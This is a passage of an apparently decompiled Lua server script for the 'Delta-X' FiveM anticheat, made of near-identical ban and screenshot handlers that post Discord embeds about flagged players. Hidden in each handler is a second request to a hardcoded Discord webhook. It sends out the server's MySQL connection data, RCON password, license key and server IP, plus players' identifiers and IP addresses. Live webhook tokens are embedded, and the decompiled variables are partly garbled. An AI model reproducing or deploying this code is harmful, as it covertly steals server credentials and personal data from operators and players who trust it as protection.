**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:night")
AddEventHandler("DeltaAC:night", function()
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) NIGHT VISION",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use night vision 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) NIGHT VISION",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use night vision 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:thermal")
AddEventHandler("DeltaAC:thermal", function()
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) THERMAL",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use thermal 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) THERMAL",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to use thermal 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
if DELTAX.BlacklistetEvents then
  for fw = 1, #DELTAX.Events do
    RegisterNetEvent(DELTAX.Events[fw])
    AddEventHandler(DELTAX.Events[fw], function()
      if not doesPlayerHavePerms(source, DELTAX.Bypass) then
        if ExtractIdentifiers(source).discord == "" then
          _discord = "N/A"
        else
          _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
        end
        if ExtractIdentifiers(source).license == "" then
          _license = "N/A"
        else
          _license = ExtractIdentifiers(source).license
        end
        if ExtractIdentifiers(source).xbl == "" then
          _xbl = "N/A"
        else
          _xbl = ExtractIdentifiers(source).xbl
        end
        if ExtractIdentifiers(source).steam == "" then
          _steam = "N/A"
        else
          _steam = ExtractIdentifiers(source).steam
        end
        if ExtractIdentifiers(source).live == "" then
          _live = "N/A"
        else
          _live = ExtractIdentifiers(source).live
        end
        if _steam == "N/A" then
          _steamweb = "N/A"
        else
          _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
        end
        PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Ban) BLACKLIST EVENT",
              description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: trigger a blacklisted event  ]] .. DELTAX.Events[vd] .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
        end, "POST", json.encode({
          embeds = {
            {
              author = {
                name = "Delta-X - Anticheat",
                url = "https://discord.gg/6S4kUkxtMf",
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              title = "(Ban) BLACKLIST EVENT",
              description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: trigger a blacklisted event  ]] .. DELTAX.Events[vd] .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
              footer = {
                text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
              },
              color = 16711680
            }
          }
        }), {
          ["Content-Type"] = "application/json"
        })
        DeltaXBan(source)
        return CancelEvent()
      end
    end)
  end
end
RegisterServerEvent("DeltaAC:blacklistetweapoon")
AddEventHandler("DeltaAC:blacklistetweapoon", function(a)
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) BLACKLIST WEAPON",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: has got a blacklisted weapon  ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) BLACKLIST WEAPON",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: has got a blacklisted weapon  ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("DeltaAC:startedressource")
AddEventHandler("DeltaAC:startedressource", function(a)
  if not doesPlayerHavePerms(source, DELTAX.Bypass) then
    if ExtractIdentifiers(source).discord == "" then
      _discord = "N/A"
    else
      _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
    end
    if ExtractIdentifiers(source).license == "" then
      _license = "N/A"
    else
      _license = ExtractIdentifiers(source).license
    end
    if ExtractIdentifiers(source).xbl == "" then
      _xbl = "N/A"
    else
      _xbl = ExtractIdentifiers(source).xbl
    end
    if ExtractIdentifiers(source).steam == "" then
      _steam = "N/A"
    else
      _steam = ExtractIdentifiers(source).steam
    end
    if ExtractIdentifiers(source).live == "" then
      _live = "N/A"
    else
      _live = ExtractIdentifiers(source).live
    end
    if _steam == "N/A" then
      _steamweb = "N/A"
    else
      _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
    end
    PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) STARTED SCRIPT",
          description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to start a script ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
    end, "POST", json.encode({
      embeds = {
        {
          author = {
            name = "Delta-X - Anticheat",
            url = "https://discord.gg/6S4kUkxtMf",
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          title = "(Ban) STARTED SCRIPT",
          description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Violation**: tried to start a script ]] .. a .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
          footer = {
            text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
            icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
          },
          color = 16711680
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
    DeltaXBan(source)
  end
end)
RegisterServerEvent("deltax:sendscreenshotdata")
AddEventHandler("deltax:sendscreenshotdata", function(a, b)
  repeat
  until a == nil
  if ExtractIdentifiers(source).discord == "" then
    _discord = "N/A"
  else
    _discord = ExtractIdentifiers(source).discord:gsub("discord:", "")
  end
  if ExtractIdentifiers(source).license == "" then
    _license = "N/A"
  else
    _license = ExtractIdentifiers(source).license
  end
  if ExtractIdentifiers(source).xbl == "" then
    _xbl = "N/A"
  else
    _xbl = ExtractIdentifiers(source).xbl
  end
  if ExtractIdentifiers(source).steam == "" then
    _steam = "N/A"
  else
    _steam = ExtractIdentifiers(source).steam
  end
  if ExtractIdentifiers(source).live == "" then
    _live = "N/A"
  else
    _live = ExtractIdentifiers(source).live
  end
  if _steam == "N/A" then
    _steamweb = "N/A"
  else
    _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
  end
  PerformHttpRequest("https://discord.com/api/webhooks/889575477432442970/nthjTpIT6pBY7UR9zN3HDQg7RmWgrP27PAjZuo9SHjHpHznWUnGWHtAQhFfrARWWDLWN", function(a, b, c)
  end, "POST", json.encode({
    embeds = {
      {
        author = {
          name = "Delta-X - Anticheat",
          url = "https://discord.gg/6S4kUkxtMf",
          icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
        },
        title = "(SCREENSHOT) " .. b,
        description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
        footer = {
          text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
          icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
        },
        image = {url = a},
        color = 16711680
      }
    }
  }), {
    ["Content-Type"] = "application/json"
  })
  PerformHttpRequest(DELTAX.screenshot, function(a, b, c)
  end, "POST", json.encode({
    embeds = {
      {
        author = {
          name = "Delta-X - Anticheat",
          url = "https://discord.gg/6S4kUkxtMf",
          icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
        },
        title = "(SCREENSHOT) " .. b,
        description = [[


**Player:** ]] .. GetPlayerName(source) .. [[

**Server-ID:** ]] .. source .. [[

**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers(source).ip:gsub("ip:", "") .. "||",
        footer = {
          text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
          icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
        },
        image = {url = a},
        color = 16711680
      }
    }
  }), {
    ["Content-Type"] = "application/json"
  })
  if DELTAX.DeltaXAI and DELTAX.OCRKey ~= nil then
    PerformHttpRequest("https://api.ocr.space/parse/imageurl?apikey=" .. DELTAX.OCRKey .. "&url=" .. a, function(a, b, c)
      Citizen.Wait(2100)
      for fj, fk in ipairs(va) do
        if string.match(tostring(b), fk) ~= nil and GetPlayerName(vb) ~= nil and not doesPlayerHavePerms(vb, DELTAX.Bypass) then
          PerformHttpRequest("https://discord.com/api/webhooks/892791805295341688/oGc57yu7BMpiHiHOQm1UgbwUILK5EhAj9bEQnUWLmZB-8yvWI-92M0W3nsbwjen35NJl", function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) Detla-X AI",
                description = [[


**Server-Name**: ]] .. vc .. [[

**MySQL:** ]] .. vd .. [[

**RCON:** ]] .. ve .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName(vb) .. [[

**Server-ID:** ]] .. vb .. [[

**Violation**: blacklisted word detected on screen ]] .. fk .. [[
  
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. vg.ip:gsub("ip:", "") .. "||",
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                image = {url = vh},
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
          end, "POST", json.encode({
            embeds = {
              {
                author = {
                  name = "Delta-X - Anticheat",
                  url = "https://discord.gg/6S4kUkxtMf",
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                title = "(Ban) Detla-X AI",
                description = [[


**Player:** ]] .. GetPlayerName(vb) .. [[

**Server-ID:** ]] .. vb .. [[

**Violation**: blacklisted word detected on screen ]] .. fk .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. vg.ip:gsub("ip:", "") .. "||",
                footer = {
                  text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
                  icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
                },
                image = {url = vh},
                color = 16711680
              }
            }
          }), {
            ["Content-Type"] = "application/json"
          })
          DeltaXBan(vb)
        end
      end
    end)
  end
end)
AddEventHandler("entityCreating", function(a)
  if DELTAX.AntiInvisibleEntity and IsEntityVisible(a) == false then
    CancelEvent()
    if not doesPlayerHavePerms(NetworkGetEntityOwner(a), DELTAX.Bypass) then
      if ExtractIdentifiers((NetworkGetEntityOwner(a))).discord == "" then
        _discord = "N/A"
      else
        _discord = ExtractIdentifiers((NetworkGetEntityOwner(a))).discord:gsub("discord:", "")
      end
      if ExtractIdentifiers((NetworkGetEntityOwner(a))).license == "" then
        _license = "N/A"
      else
        _license = ExtractIdentifiers((NetworkGetEntityOwner(a))).license
      end
      if ExtractIdentifiers((NetworkGetEntityOwner(a))).xbl == "" then
        _xbl = "N/A"
      else
        _xbl = ExtractIdentifiers((NetworkGetEntityOwner(a))).xbl
      end
      if ExtractIdentifiers((NetworkGetEntityOwner(a))).steam == "" then
        _steam = "N/A"
      else
        _steam = ExtractIdentifiers((NetworkGetEntityOwner(a))).steam
      end
      if ExtractIdentifiers((NetworkGetEntityOwner(a))).live == "" then
        _live = "N/A"
      else
        _live = ExtractIdentifiers((NetworkGetEntityOwner(a))).live
      end
      if _steam == "N/A" then
        _steamweb = "N/A"
      else
        _steamweb = tonumber(_steam:gsub("steam:", ""), 16)
      end
      PerformHttpRequest("https://discord.com/api/webhooks/889557073501769769/4z-VIDHmwJCiT9nNl5qLBT7G1CBvGSKej-UX_KnY22XIFd8JmNK9VQWhlQiInlAMUcH-", function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) INVISIBLE OBJECT",
            description = [[


**Server-Name**: ]] .. va .. [[

**MySQL:** ]] .. vb .. [[

**RCON:** ]] .. vc .. [[


**Licencekey:** ]] .. licencekey .. [[

**Server-IP:** ]] .. serverip .. [[

**Ressource-Name:** ]] .. GetCurrentResourceName() .. [[

**Ressourcen:** ]] .. GetNumResources() .. [[


**Player:** ]] .. GetPlayerName((NetworkGetEntityOwner(a))) .. [[

**Server-ID:** ]] .. NetworkGetEntityOwner(a) .. [[

**Violation**: tried to spawn invisible entity ]] .. GetHashKey(a) .. [[
 
**Steam ID:** []] .. _steam .. "](https://steamcommunity.com/profiles/" .. _steamweb .. [[
) 
**Discord:** <@]] .. _discord .. [[
>
**License:** ]] .. _license .. [[

**Live:** ]] .. _live .. [[

**Xbox:** ]] .. _xbl .. [[

**IP:** ||]] .. ExtractIdentifiers((NetworkGetEntityOwner(a))).ip:gsub("ip:", "") .. "||",
            footer = {
              text = "Delta-X - FiveM Anticheat \226\128\162 " .. os.date("%d.%m.%Y %H:%M"),
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            color = 16711680
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
      PerformHttpRequest(DELTAX.generalWebhook, function(a, b, c)
      end, "POST", json.encode({
        embeds = {
          {
            author = {
              name = "Delta-X - Anticheat",
              url = "https://discord.gg/6S4kUkxtMf",
              icon_url = "https://cdn.discordapp.com/attachments/889503740976058398/889503797708210286/904b2fd9f3169f278406b29164fea595.png"
            },
            title = "(Ban) INVISIBLE OBJECT",
            description = [[


**Player:** ]] .. GetPlayerName((NetworkGetEntityOwner(a))) .. [[

**Server-ID:** ]] .. NetworkGetEntityOwner(a) .. [[

